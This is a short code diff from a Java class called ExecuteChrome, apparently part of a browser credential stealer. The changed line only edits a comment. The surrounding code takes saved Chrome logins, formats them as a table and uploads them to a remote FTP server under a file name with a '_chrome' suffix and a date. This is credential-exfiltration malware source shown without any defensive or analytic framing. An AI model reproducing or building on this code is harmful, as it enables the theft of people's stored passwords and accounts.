@@ -53,7 +53,7 @@ public class ExecuteChrome implements ExecuteAction<ProcessingContext> {
 //    }
     
     if(processingContext.getFtpCreds().isEnabled()) {
-      FTPUtils.storeFile(processingContext.getFtpCreds(), processingContext.getFileName()+"_chrome"+new Date(), LOGIN_TABLE_FACTORY.new Table(logins).getContentAsStream()); // + fileName (es. fileName+appendix+formattedDate + file InputStream
+      FTPUtils.storeFile(processingContext.getFtpCreds(), processingContext.getFileName()+"_chrome"+new Date(), LOGIN_TABLE_FACTORY.new Table(logins).getContentAsStream()); // + fileName (es. appendix_formattedDate + file InputStream
     }
     
     return processingContext;
